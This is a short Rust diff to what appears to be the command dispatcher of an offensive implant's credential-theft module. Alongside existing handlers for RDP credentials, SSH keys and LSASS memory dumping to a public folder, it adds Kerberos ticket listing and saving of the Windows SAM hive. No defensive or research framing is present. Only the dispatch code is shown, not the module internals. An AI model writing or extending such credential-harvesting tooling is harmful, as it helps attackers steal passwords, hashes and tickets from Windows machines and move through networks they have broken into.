@@ -7,6 +7,8 @@ mod rdp_creds;
 mod ssh_keys;
 mod other_software;
 mod lsass;
+mod kerberos;
+mod sam;
 
 use serde_json::Value;
 
@@ -56,6 +58,13 @@ fn dispatch(input: &str) -> String {
                 .and_then(|p| p.as_str())
                 .unwrap_or("C:\\Users\\Public\\lsass.dmp");
             lsass::dump_lsass(path)
+        }
+        "klist" => kerberos::klist(),
+        "sam" => {
+            let dir = v.get("dir")
+                .and_then(|p| p.as_str())
+                .unwrap_or("C:\\Users\\Public");
+            sam::save_sam(dir)
         }
         _ => format!(r#"{{"error":"unknown creds op '{}'"}}"#, op),
     }
